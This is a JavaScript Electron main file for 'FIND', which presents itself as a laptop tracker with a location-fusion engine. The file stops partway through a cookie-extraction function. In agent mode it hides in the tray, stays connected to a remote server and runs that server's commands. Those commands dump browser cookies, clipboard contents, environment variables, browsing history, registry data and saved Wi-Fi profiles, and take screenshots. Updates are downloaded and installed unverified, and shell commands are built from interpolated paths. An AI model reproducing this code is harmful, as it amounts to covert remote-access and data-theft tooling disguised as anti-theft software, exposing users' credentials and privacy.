const { app, BrowserWindow, ipcMain, Tray, Menu, nativeImage, Notification } = require('electron');
const path = require('path');
const https = require('https');
const WebSocket = require('ws');
const { exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const crypto = require('crypto');

let mainWindow, tray;
let ws = null;
let pairCode = '', deviceId = '';
let isAgentMode = false;
let heartbeatInterval;
let locInterval;
const SERVER = 'https://laptop-tracker-k9vi.onrender.com';
const APP_VERSION = '2.7.0';
const CONFIG_PATH = path.join(app.getPath('userData'), 'find-config.json');

// ══════════════════════════════════════════════════════════════════════════════
// ML LOCATION FUSION ENGINE
// ══════════════════════════════════════════════════════════════════════════════
class TrackingDecisionEngine {
  constructor() {
    this.weights = { gpsConfidence: 0.30, wifiConfidence: 0.25, ipConfidence: 0.15, btConfidence: 0.10, velocityConsistency: 0.10, timeDecay: 0.10 };
    this.state = { confidence: 0, riskLevel: 'unknown', lastKnownGood: null, movementPattern: 'stationary', recommendedAction: 'wait', fusionScore: 0, fusedLat: 0, fusedLng: 0, fusedAccuracy: 9999, sourcesUsed: [] };
    this.positionBuffer = [];
    this.velocityBuffer = [];
    this.kalmanState = null;
  }
  haversine(lat1, lng1, lat2, lng2) {
    const R = 6371e3, toRad = d => d * Math.PI / 180;
    const dLat = toRad(lat2-lat1), dLng = toRad(lng2-lng1);
    const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1))*Math.cos(toRad(lat2))*Math.sin(dLng/2)**2;
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  }
  rssiToDistance(rssi, txPower = -50, n = 3.5) {
    if (!rssi || rssi === 0) return 0;
    return Math.pow(10, (txPower - rssi) / (10 * n));
  }
  trilaterate(apPositions, distances) {
    if (apPositions.length < 3) return null;
    try {
      const lat0 = apPositions[0].lat, lng0 = apPositions[0].lng, R = 6371e3, toRad = d => d * Math.PI / 180;
      const A = [], b = [];
      for (let i = 1; i < apPositions.length; i++) {
        const ax = (apPositions[i].lat - lat0) * toRad(1) * R;
        const ay = (apPositions[i].lng - lng0) * toRad(1) * R * Math.cos(toRad(lat0));
        A.push([ax, ay]);
        b.push((distances[i]**2 - distances[0]**2 + ax**2 + ay**2) / 2);
      }
      const ATA = [[0,0],[0,0]], ATb = [0,0];
      for (let i = 0; i < A.length; i++) { ATA[0][0] += A[i][0]**2; ATA[0][1] += A[i][0]*A[i][1]; ATA[1][0] += A[i][0]*A[i][1]; ATA[1][1] += A[i][1]**2; ATb[0] += A[i][0]*b[i]; ATb[1] += A[i][1]*b[i]; }
      const det = ATA[0][0]*ATA[1][1] - ATA[0][1]*ATA[1][0];
      if (Math.abs(det) < 1e-10) return null;
      const x = (ATA[1][1]*ATb[0] - ATA[0][1]*ATb[1]) / det;
      const y = (ATA[0][0]*ATb[1] - ATA[1][0]*ATb[0]) / det;
      const rLat = lat0 + (x/R)*(180/Math.PI), rLng = lng0 + (y/(R*Math.cos(toRad(lat0))))*(180/Math.PI);
      let errSum = 0;
      for (let i = 0; i < apPositions.length; i++) errSum += Math.abs(this.haversine(rLat, rLng, apPositions[i].lat, apPositions[i].lng) - distances[i]);
      return { lat: rLat, lng: rLng, accuracy: errSum / apPositions.length };
    } catch(e) { return null; }
  }
  kalmanFilter(lat, lng, accuracy) {
    if (!this.kalmanState) { this.kalmanState = { lat, lng, varLat: accuracy**2, varLng: accuracy**2 }; return { lat, lng, accuracy }; }
    const k = this.kalmanState, gLat = k.varLat/(k.varLat+accuracy**2), gLng = k.varLng/(k.varLng+accuracy**2);
    k.lat += gLat*(lat-k.lat); k.lng += gLng*(lng-k.lng);
    k.varLat = (1-gLat)*k.varLat+0.01; k.varLng = (1-gLng)*k.varLng+0.01;
    return { lat: k.lat, lng: k.lng, accuracy: Math.sqrt(k.varLat+k.varLng)/2 };
  }
  weightedCentroid(estimates) {
    if (estimates.length === 0) return null;
    if (estimates.length === 1) return estimates[0];
    let tw=0, wLat=0, wLng=0;
    for (const e of estimates) { const w = e.weight || (1/Math.max(e.accuracy,1)); wLat+=e.lat*w; wLng+=e.lng*w; tw+=w; }
    let accSum=0; for (const e of estimates) { const w = e.weight||(1/Math.max(e.accuracy,1)); accSum+=e.accuracy*(w/tw); }
    return { lat: wLat/tw, lng: wLng/tw, accuracy: accSum };
  }
  ipSourceWeight(source) { const w={'ip-api.com':0.85,'ipinfo.io':0.80,'ipapi.co':0.75,'bigdatacloud.com':0.70}; return w[source]||0.5; }
  refineIPLocation(ipResults) {
    if (!ipResults || ipResults.length===0) return null;
    const valid = ipResults.filter(r=>r.lat&&r.lng&&r.accuracy);
    if (valid.length===0) return null;
    const clusters = [];
    for (const r of valid) { let found=false; for (const c of clusters) { if (this.haversine(r.lat,r.lng,c.lat,c.lng)<5000) { c.results.push(r); let tw=0,wl=0,wg=0; for (const cr of c.results) { const w=this.ipSourceWeight(cr.source)/Math.max(cr.accuracy,100); wl+=cr.lat*w; wg+=cr.lng*w; tw+=w; } c.lat=wl/tw; c.lng=wg/tw; c.accuracy=c.results.reduce((s,x)=>s+x.accuracy,0)/c.results.length; found=true; break; } } if (!found) clusters.push({lat:r.lat,lng:r.lng,accuracy:r.accuracy,results:[r]}); }
    clusters.sort((a,b)=>b.results.length-a.results.length); const best=clusters[0]; best.accuracy=best.accuracy/Math.sqrt(best.results.length);
    return { lat:best.lat, lng:best.lng, accuracy:best.accuracy, sourceCount:best.results.length };
  }
  update(locationData, wifiData, ipData, btData) {
    const scores={}, estimates=[], sourcesUsed=[];
    if (locationData && locationData.lat && locationData.lng) {
      if (locationData.source==='gps' && locationData.accuracy<50) { scores.gps=Math.max(0,1-locationData.accuracy/100); estimates.push({lat:locationData.lat,lng:locationData.lng,accuracy:locationData.accuracy,weight:0.35}); sourcesUsed.push('gps'); }
      else if (locationData.source?.includes('bssid')) { scores.gps=Math.max(0,1-locationData.accuracy/500); estimates.push({lat:locationData.lat,lng:locationData.lng,accuracy:locationData.accuracy,weight:0.25}); sourcesUsed.push('bssid'); }
      else if (locationData.source?.includes('ip')) { scores.gps=0.3; estimates.push({lat:locationData.lat,lng:locationData.lng,accuracy:locationData.accuracy||5000,weight:0.15}); sourcesUsed.push('ip-fallback'); }
      else { scores.gps=0.2; }
    } else { scores.gps=0; }
    if (wifiData && wifiData.length>=3) { const apPos=[],dists=[]; for (const ap of wifiData) { if (ap.rssi&&ap.rssi!==0&&ap.lat&&ap.lng) { apPos.push({lat:ap.lat,lng:ap.lng}); dists.push(this.rssiToDistance(ap.rssi,ap.txPower||-50,ap.pathLoss||3.5)); } } if (apPos.length>=3) { const tri=this.trilaterate(apPos,dists); if (tri&&tri.accuracy<2000) { estimates.push({lat:tri.lat,lng:tri.lng,accuracy:tri.accuracy,weight:0.25}); sourcesUsed.push('wifi-trilateration'); scores.wifi=Math.min(1,0.5+(apPos.length/6)*0.5); } else { const strong=wifiData.filter(a=>a.rssi>-70).length; scores.wifi=Math.min(1,(strong/3)*0.7+(wifiData.length/10)*0.3); } } else { const strong=wifiData.filter(a=>a.rssi>-70).length; scores.wifi=Math.min(1,(strong/3)*0.7+(wifiData.length/10)*0.3); } } else { scores.wifi=0; }
    if (ipData && ipData.results) { const refined=this.refineIPLocation(ipData.results); if (refined) { estimates.push({lat:refined.lat,lng:refined.lng,accuracy:refined.accuracy,weight:0.15}); sourcesUsed.push('ip-crossref('+refined.sourceCount+')'); scores.ip=Math.min(1,0.3+(refined.sourceCount/4)*0.5); } else if (ipData.bestResult&&ipData.bestResult.lat) { scores.ip=0.25; estimates.push({lat:ipData.bestResult.lat,lng:ipData.bestResult.lng,accuracy:ipData.bestResult.accuracy||5000,weight:0.15}); sourcesUsed.push('ip-single'); } else { scores.ip=0; } } else { scores.ip=0; }
    if (btData && btData.length>0) { const strong=btData.filter(d=>d.rssi>-60).length; scores.bt=Math.min(1,(strong/3)*0.6+(btData.length/10)*0.4); sourcesUsed.push('ble('+btData.length+')'); } else { scores.bt=0; }
    if (this.positionBuffer.length>=2) { const vel=this.calculateVelocity(); scores.velocity=vel<50?1:(vel<200?0.8:(vel<500?0.5:0.2)); } else { scores.velocity=0.5; }
    const age=locationData?.timestamp?(Date.now()-locationData.timestamp)/1000:999; scores.timeDecay=Math.max(0,1-age/300);
    let fusionScore=0; for (const [key,weight] of Object.entries(this.weights)) { const scoreKey=key.replace('Confidence','').replace('Consistency',''); fusionScore+=(scores[scoreKey]||0)*weight; }
    let fusedPos=null; if (estimates.length>0) { fusedPos=this.weightedCentroid(estimates); if (fusedPos) fusedPos=this.kalmanFilter(fusedPos.lat,fusedPos.lng,fusedPos.accuracy); }
    this.state.confidence=fusionScore; this.state.fusionScore=fusionScore; this.state.riskLevel=fusionScore>0.7?'low':fusionScore>0.4?'medium':'high'; this.state.movementPattern=this.classifyMovement(); this.state.recommendedAction=this.recommendAction(); this.state.sourcesUsed=sourcesUsed;
    if (fusedPos) { this.state.fusedLat=fusedPos.lat; this.state.fusedLng=fusedPos.lng; this.state.fusedAccuracy=fusedPos.accuracy; }
    if (fusionScore>0.6 && locationData) this.state.lastKnownGood={...locationData,confidence:fusionScore};
    return this.state;
  }
  classifyMovement() { if (this.velocityBuffer.length<2) return 'insufficient-data'; const avg=this.velocityBuffer.reduce((a,b)=>a+b,0)/this.velocityBuffer.length; if (avg<0.5) return 'stationary'; if (avg<5) return 'walking'; if (avg<30) return 'vehicle-urban'; if (avg<100) return 'vehicle-highway'; return 'vehicle-fast'; }
  recommendAction() { const {confidence,movementPattern}=this.state; if (confidence<0.2) return 'emergency-all-probes'; if (confidence<0.4) return 'activate-all-probes'; if (movementPattern==='vehicle-fast') return 'alert-high-speed'; if (movementPattern==='vehicle-urban') return 'track-every-10s'; if (movementPattern==='walking') return 'track-every-30s'; return 'track-every-60s'; }
  calculateVelocity() { if (this.positionBuffer.length<2) return 0; const last=this.positionBuffer[this.positionBuffer.length-1], prev=this.positionBuffer[this.positionBuffer.length-2]; const dist=this.haversine(last.lat,last.lng,prev.lat,prev.lng); const dt=(last.timestamp-prev.timestamp)/1000; return dt>0?dist/dt:0; }
  addPosition(lat, lng, accuracy, source) { this.positionBuffer.push({lat,lng,accuracy,source,timestamp:Date.now()}); if (this.positionBuffer.length>50) this.positionBuffer.shift(); if (this.positionBuffer.length>=2) { this.velocityBuffer.push(this.calculateVelocity()); if (this.velocityBuffer.length>20) this.velocityBuffer.shift(); } }
  getReport() { return { ...this.state, positionSamples: this.positionBuffer.length, velocitySamples: this.velocityBuffer.length, avgVelocity: this.velocityBuffer.length>0?this.velocityBuffer.reduce((a,b)=>a+b,0)/this.velocityBuffer.length:0, maxVelocity: Math.max(0,...this.velocityBuffer), pathDistance: this.calculatePathDistance(), lastUpdate: Date.now() }; }
  calculatePathDistance() { let total=0; for (let i=1; i<this.positionBuffer.length; i++) total+=this.haversine(this.positionBuffer[i-1].lat,this.positionBuffer[i-1].lng,this.positionBuffer[i].lat,this.positionBuffer[i].lng); return total; }
}
const decisionEngine = new TrackingDecisionEngine();

function loadConfig() {
    try {
        if (fs.existsSync(CONFIG_PATH)) {
            const c = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
            pairCode = c.pairCode || '';
            deviceId = c.deviceId || '';
            isAgentMode = c.isAgentMode || false;
        }
    } catch (e) {}
}

function saveConfig() {
    fs.writeFileSync(CONFIG_PATH, JSON.stringify({ pairCode, deviceId, isAgentMode }));
}

function apiPost(path, body) {
    return new Promise((resolve) => {
        const data = JSON.stringify(body);
        const url = new URL(SERVER + path);
        const req = https.request({
            hostname: url.hostname, port: 443, path: url.pathname,
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
        }, (res) => {
            let buf = '';
            res.on('data', (c) => buf += c);
            res.on('end', () => { try { resolve(JSON.parse(buf)); } catch (e) { resolve(null); } });
        });
        req.on('error', () => resolve(null));
        req.write(data);
        req.end();
    });
}

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 440, height: 780, minWidth: 400, minHeight: 600,
        frame: false, backgroundColor: '#0a0a0f',
        webPreferences: { nodeIntegration: true, contextIsolation: false, webviewTag: false },
        title: 'FIND', resizable: true, show: false
    });

    mainWindow.loadFile(path.join(__dirname, 'index.html'));
    mainWindow.once('ready-to-show', () => {
        mainWindow.show();
        // Show location permission dialog
        setTimeout(() => {
            const choice = require('electron').dialog.showMessageBoxSync(mainWindow, {
                type: 'question',
                title: 'Location Permission',
                message: 'FIND needs access to your laptop\'s location to track devices. Allow location access?',
                buttons: ['Allow', 'Deny'],
                defaultId: 0
            });
            mainWindow.webContents.send('location-permission', choice === 0);
        }, 2000);
    });
    mainWindow.on('close', (e) => { if (isAgentMode) { e.preventDefault(); mainWindow.hide(); } });
}

function createTray() {
    let icon = nativeImage.createEmpty();
    try { icon = nativeImage.createFromPath(path.join(__dirname, 'icon.png')); } catch (e) {}
    tray = new Tray(icon);
    tray.setToolTip('FIND Tracker');
    tray.setContextMenu(Menu.buildFromTemplate([
        { label: 'Show', click: () => mainWindow.show() },
        { label: 'Agent Mode', type: 'checkbox', checked: isAgentMode, click: (item) => { isAgentMode = item.checked; saveConfig(); isAgentMode ? startAgent() : stopAgent(); } },
        { type: 'separator' },
        { label: 'Quit', click: () => { isAgentMode = false; app.quit(); } }
    ]));
    tray.on('double-click', () => mainWindow.show());
}

function checkForUpdate() {
    https.get(SERVER + '/api/version', (res) => {
        let data = '';
        res.on('data', (c) => data += c);
        res.on('end', () => {
            try {
                const info = JSON.parse(data);
                if (info.version && info.version !== APP_VERSION) {
                    const choice = require('electron').dialog.showMessageBoxSync(mainWindow, {
                        type: 'info',
                        title: 'Update Available',
                        message: 'v' + info.version + ' is available.\n\n' + (info.releaseNotes || 'Bug fixes and improvements') + '\n\nUpdate now? The app will restart.',
                        buttons: ['Update Now', 'Later'],
                        defaultId: 0
                    });
                    if (choice === 0) {
                        downloadAndUpdate(info.version);
                    }
                }
            } catch (e) {}
        });
    }).on('error', () => {});
}

function downloadAndUpdate(version) {
    const fs = require('fs');
    const { exec } = require('child_process');
    const appPath = path.dirname(process.execPath);
    const zipPath = path.join(app.getPath('temp'), 'FIND-update.zip');
    const extractPath = path.join(app.getPath('temp'), 'FIND-extract');
    const url = SERVER + '/FIND-Windows.zip';

    // Show progress
    mainWindow.webContents.send('update-status', 'Downloading v' + version + '...');

    https.get(url, (res) => {
        if (res.statusCode === 302 || res.statusCode === 301) {
            https.get(res.headers.location, (res2) => downloadToFile(res2, zipPath, () => extractAndUpdate(zipPath, extractPath, appPath)));
        } else {
            downloadToFile(res, zipPath, () => extractAndUpdate(zipPath, extractPath, appPath));
        }
    }).on('error', (e) => {
        require('electron').dialog.showErrorBox('Update Failed', 'Download failed: ' + e.message);
    });
}

function downloadToFile(res, filePath, callback) {
    const fs = require('fs');
    const file = fs.createWriteStream(filePath);
    res.pipe(file);
    file.on('finish', () => { file.close(); callback(); });
    file.on('error', (e) => { fs.unlink(filePath, ()=>{}); require('electron').dialog.showErrorBox('Update Failed', e.message); });
}

function extractAndUpdate(zipPath, extractPath, appPath) {
    const { exec } = require('child_process');
    const fs = require('fs');

    const cmd = `powershell -Command "Expand-Archive -Path '${zipPath}' -DestinationPath '${extractPath}' -Force"`;
    exec(cmd, { timeout: 120000 }, (err) => {
        if (err) {
            require('electron').dialog.showErrorBox('Update Failed', 'Extract failed: ' + err.message);
            return;
        }
        try {
            const items = fs.readdirSync(extractPath);
            const findDir = items.find(i => i.includes('FIND'));
            if (!findDir) { require('electron').dialog.showErrorBox('Update Failed', 'FIND folder not found. Contents: ' + items.join(', ')); return; }

            const srcDir = path.join(extractPath, findDir);
            // robocopy exit codes 0-7 are success conditions
            const robocopy = `robocopy "${srcDir}" "${appPath}" /E /IS /IT /NFL /NDL /NJH /NJS /nc /ns /np`;
            exec(robocopy, { timeout: 120000 }, (err2) => {
                try { fs.rmSync(extractPath, { recursive: true, force: true }); } catch(e) {}
                try { fs.rmSync(zipPath, { force: true }); } catch(e) {}

                const exitCode = err2 ? err2.code || 0 : 0;
                if (exitCode > 7) {
                    require('electron').dialog.showErrorBox('Update Failed', 'Copy failed with code: ' + exitCode);
                    return;
                }
                require('electron').dialog.showMessageBox(mainWindow, {
                    type: 'info',
                    title: 'Update Installed',
                    message: 'Updated successfully. The app will restart now.',
                    buttons: ['OK']
                }).then(() => {
                    app.relaunch();
                    app.exit(0);
                });
            });
        } catch (e) {
            require('electron').dialog.showErrorBox('Update Failed', e.message);
        }
    });
}

let agentReconnectDelay = 1000;
function startAgent() {
    if (!pairCode) return;
    stopAgent();
    const wsUrl = SERVER.replace('https://', 'wss://').replace('http://', 'ws://');
    ws = new WebSocket(wsUrl);

    ws.on('open', () => {
        agentReconnectDelay = 1000;
        ws.send(JSON.stringify({ type: 'register', deviceId: pairCode, deviceType: 'agent' }));
        // Real-time location push over WebSocket every 3s (cheap, low latency).
        // Uses fused multi-source IP scrape + ML smoothing for a stable position.
        locInterval = setInterval(async () => {
            if (!(ws && ws.readyState === WebSocket.OPEN)) return;
            try {
                const ip = await scrapePublicIP();
                let loc = null;
                if (ip && ip.bestResult && ip.bestResult.lat) {
                    loc = { lat: ip.bestResult.lat, lng: ip.bestResult.lng, accuracy: ip.bestResult.accuracy || 3000, source: 'ip-fused' };
                    decisionEngine.addPosition(loc.lat, loc.lng, loc.accuracy, 'ip-fused');
                }
                // Prefer an ML-fused position if the engine has one, else use IP.
                const report = decisionEngine.state;
                if (report && report.fusedLat && report.fusedLng && report.fusedAccuracy < 10000) {
                    loc = { lat: report.fusedLat, lng: report.fusedLng, accuracy: Math.round(report.fusedAccuracy), source: 'ml-fusion' };
                }
                if (loc) ws.send(JSON.stringify({ type: 'location', deviceId: pairCode, location: loc }));
            } catch(e) {}
        }, 3000);
        // Send heartbeat + location via HTTP every 10s (persists online status)
        heartbeatInterval = setInterval(async () => {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ type: 'heartbeat', deviceId: pairCode }));
            }
            try {
                const loc = await getQuickLocation();
                const body = JSON.stringify({ deviceId: pairCode, location: loc });
                const url = new URL(SERVER + '/api/heartbeat');
                const req = https.request({
                    hostname: url.hostname, port: 443, path: url.pathname,
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
                }, () => {});
                req.on('error', () => {});
                req.write(body);
                req.end();
            } catch(e) {}
        }, 10000);
        if (mainWindow) mainWindow.webContents.send('agent-status', true);
    });

    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw);
            if (msg.type === 'command') handleCommand(msg);
        } catch (e) {}
    });

    ws.on('close', (code) => {
        if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
        if (locInterval) { clearInterval(locInterval); locInterval = null; }
        if (mainWindow) mainWindow.webContents.send('agent-status', false);
        // Reconnect as long as a pairCode exists — agent stays alive while paired
        if (pairCode) {
            setTimeout(startAgent, agentReconnectDelay);
            agentReconnectDelay = Math.min(agentReconnectDelay * 2, 30000);
        }
    });

    ws.on('error', () => {});
}

async function getQuickLocation() {
    // ip-api.com is significantly more accurate for Africa/Ghana (city-level, ~2km radius)
    const ipApiResult = await new Promise(resolve => {
        https.get('https://ip-api.com/json/?fields=status,lat,lon,city,regionName,country,isp,query', { timeout: 5000 }, res => {
            let d = '';
            res.on('data', c => d += c);
            res.on('end', () => {
                try {
                    const j = JSON.parse(d);
                    if (j.status === 'success' && j.lat && j.lon) {
                        resolve({ lat: j.lat, lng: j.lon, accuracy: 2000, source: 'ip-api.com', city: j.city, region: j.regionName, country: j.country, ip: j.query });
                    } else resolve(null);
                } catch(e) { resolve(null); }
            });
        }).on('error', () => resolve(null));
    });
    if (ipApiResult) return ipApiResult;

    // Fallback: ipinfo.io
    return new Promise(resolve => {
        https.get('https://ipinfo.io/json', { timeout: 5000 }, res => {
            let d = '';
            res.on('data', c => d += c);
            res.on('end', () => {
                try {
                    const j = JSON.parse(d);
                    if (j.loc) {
                        const parts = j.loc.split(',');
                        resolve({ lat: parseFloat(parts[0]), lng: parseFloat(parts[1]), accuracy: 3000, source: 'ipinfo-heartbeat', city: j.city, region: j.region, country: j.country });
                    } else resolve(null);
                } catch(e) { resolve(null); }
            });
        }).on('error', () => resolve(null));
    });
}

function stopAgent() {
    if (ws) { try { ws.close(); } catch (e) {} ws = null; }
    if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
    if (locInterval) { clearInterval(locInterval); locInterval = null; }
}

function handleCommand(msg) {
    const { commandType: type, commandId: id } = msg;
    const handlers = {
        'locate': async () => {
            // Collect ALL sources and feed into ML engine
            const gpsData = await new Promise(resolve => {
                exec('powershell -Command "Add-Type System.Device; $w=New-Object System.Device.Location.GeoCoordinateWatcher; $w.Start(); Start-Sleep 2; $l=$w.Position.Location; if($l.IsUnknown){"{}"} else{\'{\\"lat\\":\'+($l.Latitude -replace \',\' ,\'.\')+\',\\"lng\\":\'+($l.Longitude -replace \',\' ,\'.\')+\',\\"accuracy\\":\'+($l.HorizontalAccuracy -replace \',\' ,\'.\')+\',\\"source\\":\\"gps\\"}\'}"', { maxBuffer: 1024*1024 }, (e, stdout) => {
                    try { const d = JSON.parse(stdout); if (d.lat) resolve(d); else resolve(null); } catch(e) { resolve(null); }
                });
            });
            // WiFi scan
            const wifiRaw = await shell('netsh wlan show networks mode=bssid');
            const wifiData = [];
            const apMatches = wifiRaw.matchAll(/BSSID \d+:\s*\n\s*Signal:\s*(\d+)%\s*\n\s*.*?:\s*([0-9A-Fa-f:-]+)/gi);
            for (const m of apMatches) { const sig=parseInt(m[1]); if (sig>0) wifiData.push({ bssid:m[2], rssi:Math.round((sig/2)-100), ssid:'' }); }
            // IP geolocation
            const ipData = await new Promise(resolve => {
                https.get('https://ipinfo.io/json', {timeout:5000}, res => { let d=''; res.on('data',c=>d+=c); res.on('end',()=>{ try { const j=JSON.parse(d); resolve({results:[{source:'ipinfo.io',lat:j.loc?parseFloat(j.loc.split(',')[0]):null,lng:j.loc?parseFloat(j.loc.split(',')[1]):null,accuracy:3000,ip:j.ip,city:j.city,region:j.region,country:j.country,isp:j.org}],bestResult:{lat:j.loc?parseFloat(j.loc.split(',')[0]):null,lng:j.loc?parseFloat(j.loc.split(',')[1]):null,accuracy:3000,city:j.city,region:j.region,country:j.country,isp:j.org},confirmedIP:j.ip,sourceCount:1}); } catch(e) { resolve(null); } });
                }).on('error', ()=>resolve(null));
            });
            // BLE
            const btRaw = await shell('powershell "Get-PnpDevice -Class Bluetooth | Select FriendlyName,Status"');
            const btData = btRaw.split('\n').filter(l => l.includes('OK')).map(l => ({ name: l.trim(), rssi: -50 }));

            // Feed ALL into ML engine
            const mlState = decisionEngine.update(gpsData, wifiData, ipData, btData);
            let result;
            if (mlState.fusedLat && mlState.fusedLng && mlState.fusedAccuracy < 10000) {
                result = JSON.stringify({ lat: mlState.fusedLat, lng: mlState.fusedLng, accuracy: Math.round(mlState.fusedAccuracy), source: 'ml-fusion', confidence: mlState.fusionScore, sourcesUsed: mlState.sourcesUsed });
                decisionEngine.addPosition(mlState.fusedLat, mlState.fusedLng, mlState.fusedAccuracy, 'ml-fusion');
            } else if (gpsData && gpsData.lat) {
                result = JSON.stringify(gpsData);
            } else if (ipData && ipData.bestResult && ipData.bestResult.lat) {
                result = JSON.stringify(ipData.bestResult);
            } else {
                result = JSON.stringify({ source: 'none', message: 'No location available' });
            }
            return result;
        },
        'lock': () => shell('rundll32.exe user32.dll,LockWorkStation'),
        'siren': () => { shell('powershell -Command "(New-Object Media.SoundPlayer \'C:\\Windows\\Media\\Alarm01.wav\').PlayLooping(); Start-Sleep -Seconds 15"'); return Promise.resolve('{"ok":true}'); },
        'screenshot': () => shell('powershell -Command "Add-Type System.Windows.Forms; $s=[System.Windows.Forms.Screen]::PrimaryScreen; $b=New-Object Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); $g=[Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Bounds.Location,[Drawing.Point]::Empty,$s.Bounds.Size); $b.Save(\'C:\\Windows\\Temp\\find-ss.png\'); $b.Dispose(); $g.Dispose()"'),
        'wifi-scan': () => shell('netsh wlan show networks mode=bssid'),
        'arp-scan': () => shell('arp -a'),
        'port-audit': () => shell('netstat -ano'),
        'process-audit': () => shell('tasklist /FO CSV'),
        'usb-audit': () => shell('wmic path win32_pnpentity get name'),
        'wifi-passwords': () => shell('netsh wlan show profile'),
        'dns-dump': () => shell('ipconfig /displaydns'),
        'bt-proximity': () => shell('powershell "Get-PnpDevice -Class Bluetooth | Select Name,Status"'),
        'ip-scrape': async () => JSON.stringify(await scrapePublicIP()),
        'wifi-analysis': () => shell('netsh wlan show networks mode=bssid'),
        'network-scan': () => shell('arp -a && netstat -ano'),
        'bt-scan': () => shell('powershell "Get-PnpDevice -Class Bluetooth | Select FriendlyName,Status,InstanceId"'),
        'network-fingerprint': () => shell('netsh wlan show interfaces && arp -a && netstat -r'),
        'ml-report': () => Promise.resolve(JSON.stringify(decisionEngine.getReport())),
        'full-recovery-scan': async () => { const ip = await scrapePublicIP(); return JSON.stringify({ip, processes: await shell('tasklist /FO CSV'), network: await shell('arp -a && netstat -ano')}); },
        'cookie-dump': () => cookieDump(),
        'clipboard-grab': () => clipboardGrab(),
        'env-dump': () => envDump(),
        'history-dump': () => historyDump(),
        'installed-apps': () => installedApps(),
        'geo-triangulate': () => geoTriangulate(),
        'open-ports-deep': () => openPortsDeep(),
        'registry-dump': () => registryDump(),
        'active-connections': () => activeConnections(),
        'system-screenshot': () => systemScreenshot()
    };
    const fn = handlers[type];
    if (fn) fn().then(r => sendResult(id, type, r));
}

async function scrapePublicIP() {
    const results = [];
    const sources = [
        { url: 'https://ipinfo.io/json', weight: 0.80 },
        { url: 'https://ipapi.co/json/', weight: 0.75 },
        { url: 'https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,org,mobile,query', weight: 0.85 }
    ];
    const fetchUrl = (url) => new Promise(resolve => {
        https.get(url, {timeout:5000}, res => { let d=''; res.on('data',c=>d+=c); res.on('end',()=>{ try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } }); }).on('error', ()=>resolve(null));
    });
    const settled = await Promise.allSettled(sources.map(s => fetchUrl(s.url)));
    for (let i = 0; i < settled.length; i++) {
        if (settled[i].status !== 'fulfilled') continue;
        const data = settled[i].value, src = sources[i];
        const ip = data.query||data.ip; const lat = data.lat||data.latitude; const lng = data.lon||data.longitude;
        if (!lat||!lng) continue;
        let accuracy = 3000;
        if (data.accuracy) accuracy = data.accuracy;
        else if (data.city&&data.zip) accuracy = 2000;
        if (data.mobile) accuracy = Math.min(accuracy, 1000);
        results.push({ source: src.url.split('/')[2], ip, lat, lng, city: data.city, region: data.regionName||data.region, country: data.country, isp: data.isp||data.org, accuracy, weight: src.weight });
    }
    let bestResult = null;
    if (results.length >= 2) { let tw=0,wl=0,wg=0; for (const r of results) { const w=r.weight/Math.max(r.accuracy,100); wl+=r.lat*w; wg+=r.lng*w; tw+=w; } bestResult = { lat:wl/tw, lng:wg/tw, accuracy:Math.round(1500/Math.sqrt(results.length)), city:results[0].city, region:results[0].region, country:results[0].country, isp:results[0].isp, sourceCount:results.length }; }
    else if (results.length === 1) bestResult = {...results[0]};
    return { results, bestResult, confirmedIP: results[0]?.ip, sourceCount: results.length };
}

function shell(cmd) {
    return new Promise((resolve) => {
        exec(cmd, { maxBuffer: 1024 * 1024 }, (err, stdout) => resolve(err ? err.message : stdout));
    });
}

function runPowerShell(ps, timeoutMs = 10000) {
    return new Promise((resolve) => {
        const cmd = 'powershell -NoProfile -NonInteractive -Command "' + ps.replace(/"/g, '\\"') + '"';
        exec(cmd, { maxBuffer: 1024 * 1024, timeout: timeoutMs, windowsHide: true }, (err, stdout) => {
            resolve({ success: !err, stdout: (stdout || '').trim(), stderr: err ? (err.message || '') : '' });
        });
    });
}

// ─── FORENSIC TOOLS ─────────────────────────────────────────────────────────

function getServiceName(port) {
    const services = { 21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',110:'POP3',135:'RPC',139:'NetBIOS',143:'IMAP',443:'HTTPS',445:'SMB',993:'IMAPS',995:'POP3S',1433:'MSSQL',1723:'PPTP',3306:'MySQL',3389:'RDP',5900:'VNC',8080:'HTTP-Alt',8443:'HTTPS-Alt',27017:'MongoDB',6379:'Redis',5432:'PostgreSQL',1521:'Oracle',5000:'UPnP',8000:'HTTP-Alt2',8888:'HTTP-Alt3',9000:'SonarQube',9200:'Elasticsearch',9300:'Elasticsearch' };
    return services[port] || 'unknown';
}

// Extract Chrome/Edge cookies (SQLite) to a temp copy, query via PowerShell
async function cookieDump() {
    const cookies = {};
    const chromePaths = [
        path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
        path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
    ];
    for (const cookiePath of chromePaths) {
        if (fs.existsSync(cookiePath)) {
            try {
                const tempPath = path.join(os.tmpdir(), 'find_cookies_' + Date.now() + '.db');
                fs.copyFileSync(cookiePath, tempPath);
                const ps = `
                    Add-Type -AssemblyName System.Data.SQLite;
                    $conn = New-Object System.Data.SQLite.SQLiteConnection;
                    $conn.ConnectionString = "Data Source=${tempPath.replace(/\\/g,'\\\\')};Read Only=True";
                    $conn.Open();
                    $cmd = $conn.CreateCommand();
                    $cmd.CommandText = "SELECT host_key, name, path, is_secure, is_httponly FROM cookies";
                    $reader = $cmd.ExecuteReader();
                    $results = @();
